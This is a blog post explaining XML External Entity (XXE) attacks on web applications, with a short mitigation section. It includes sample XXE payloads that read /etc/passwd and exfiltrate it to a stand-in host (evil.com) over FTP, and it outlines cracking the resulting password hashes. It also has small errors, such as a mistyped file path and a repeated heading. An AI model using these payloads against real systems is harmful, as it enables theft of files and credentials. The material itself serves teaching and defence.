---
layout: post
title: Web Application Security - XML External Entity (XXE) Attack
published: true
---

Here in the blog post, we will learn about another type of attack, XML External Entity (XXE), which relies on an improperly configured XML parser on the application code. Even though the mitigation is easier for these sets of attacks, however, once it is uncovered that XXE attack can be successful, the attacker can very well take over the instance also as a result, making it one of the deadliest attacks. Due to such a high-risk nature, even though the use of XML payload is sunsetting now, with more web applications relying upon JSON, it is still ranked as 5th out of OWASP's top 10 most critical security risks to web applications as of today (Nov-2024). In this blog post we will explore different types of XXE attacks, how XXE can be used for system takeover, and how to mitigate such attacks by properly configuring XML parsers.


### Type of XXE attacks:

The XXE attack vulnerability involves some API endpoint, which either takes an XML payload, or the non-XML payload is processed to generate an intermediate XML payload, which is then later processed by an XML parser, maybe by some internal legacy application.

The XXE attack can target any format following XML-like specifications, including SVG, HTML/DOM, PDF, RTF, etc. In all these attacks, the attacker tries to provide an external entity, which is interpreted by the system on which the XML parser parses the request. This means, the attacker can request to see any files from the local file system, which then the improperly configured XML parser resolves, and returns the response with the content from local file systems, compromising the system.

Example of such XML payload:
```xml
<!DOCTYPE fooo [ <!ENTITY ext SYSTEM "file:///etc/password"> ]>
```

##### Direct XXE attack:

![](../images/web-security/XXE_direct.png)


##### Direct XXE attack:

![](../images/web-security/XXE_indirect.png)


##### Out-of-Band Data Exfiltration:
Certain times, web applications rely on XML parsers for some intermediate operations. In those cases, the output of the internal operation might not be visible directly as a response. In those cases, an out-of-band data exfiltration technique can be used. This technique is used by attackers to redirect the output by transmitting it over some alternative communication channel. For example, some XXE payload can be created that would try to transmit information from the system to a specific FTP server like the following:

```xml
 <!ENTITY % d SYSTEM "file:///etc/passwd">
 <!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://evil.com/%d;'>">
```


### How to perform account takeover with XXE:

The /etc/passwd file in the Linux file system contains user and group-related information. It also contains the location to check for the hashed password for that user. The second column generally contains the password storage location (x denotes the default password storage location at /etc/shadow). Once the hashed password is obtained, there are several third-party password cracking tools like "John the Ripper" or "Hashcat" to generate plain-text passwords from hashed passwords. There are several tools available like "unshadow" which formats the captured file-system contents so that they can be fed to these password-cracking tools.


### Mitigation:

Disable external entities in XML parser: Typically it's just a single line of configuration:

```java
    factory.setFeature("https://apache.org/xml/features/disallow-doctype-decl", true)
```


### References
1. Web Application Security by Andrew Hoffman
